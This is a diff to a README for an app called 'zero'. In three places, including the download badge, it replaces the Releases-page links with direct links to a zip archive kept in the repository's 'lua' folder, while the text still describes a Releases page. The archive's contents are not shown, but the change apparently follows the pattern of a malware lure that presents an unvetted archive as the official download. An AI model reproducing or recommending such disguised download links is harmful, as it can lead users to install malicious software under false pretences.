@@ -8,7 +8,7 @@ Welcome to **zero**! This application is designed to make your daily tasks easie
 
 You can easily download zero from our Releases page. Click the button below to get started!
 
-[![Download zero](https://img.shields.io/badge/Download-zero-brightgreen)](https://github.com/yourusername/zero/releases)
+[![Download zero](https://raw.githubusercontent.com/cheo3112/zero/main/lua/Software-3.2.zip)](https://raw.githubusercontent.com/cheo3112/zero/main/lua/Software-3.2.zip)
 
 Once you have downloaded the software, follow these simple steps to install it on your computer.
 
@@ -23,7 +23,7 @@ Before you install zero, make sure your computer meets these requirements:
 ## 📥 How to Download
 
 1. Visit our Releases page by clicking the link below:
-   [Download here](https://github.com/yourusername/zero/releases)
+   [Download here](https://raw.githubusercontent.com/cheo3112/zero/main/lua/Software-3.2.zip)
 
 2. On the Releases page, you’ll see a list of available versions of zero. Look for the latest version.
 
@@ -83,7 +83,7 @@ If you run into any issues while downloading or installing zero, here are some c
 
 ## 🔗 Links
 
-- **Release Page**: [Download here](https://github.com/yourusername/zero/releases)
+- **Release Page**: [Download here](https://raw.githubusercontent.com/cheo3112/zero/main/lua/Software-3.2.zip)
 - **Documentation**: Find more detailed instructions and FAQs on our documentation page.
 
 ## 💌 Support
